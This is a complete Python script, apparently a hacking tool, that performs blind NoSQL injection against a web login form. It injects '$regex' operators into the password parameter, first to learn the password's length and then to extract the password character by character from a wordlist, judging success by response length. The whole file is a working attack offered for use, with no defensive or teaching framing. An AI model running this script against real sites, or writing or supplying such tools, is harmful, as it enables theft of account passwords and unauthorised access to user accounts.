import requests
import sys

if len(sys.argv) < 2:
    print("python3 program.py url username passwordlenght usernamepostargument passwordpostargument nosuccessresponselenght")
    print("Put passwordlenght as -1 if you want to enumerate")
    exit()

url = sys.argv[1]
user = sys.argv[2]
pisteet = int(sys.argv[3])



enume = False
if pisteet == -1:
    enume = True



userarg = sys.argv[4]
passw = sys.argv[5]
notsuccesslen = int(sys.argv[6])



pitsar = ""
if enume:
 for i in range(200):
   testa = "^.{" + str(i) + "}$" 
   data2 = {
    userarg: user,
    passw + "[$regex]": testa  
   }
   print(data2)
   reg = requests.post(url, data=data2)
   print(len(reg.text))
   if len(reg.text) != notsuccesslen:
         pisteet = i 
         break 



pisteet = "." * pisteet

ab = open("abcs.txt", "r").readlines()
for i in range(len(pisteet)):


 pisteet = pisteet[1:len(pisteet)]
 for a in ab:


   testa = "^" + pitsar.strip("\n") + a.strip("\n") + pisteet


   data2 = {
    userarg: user,
    passw + "[$regex]": testa  
   }
   print(data2)

   reg = requests.post(url, data=data2)
   print(len(reg.text))


   if len(reg.text) != notsuccesslen:
         pitsar = pitsar + a.strip("\n")
         break 
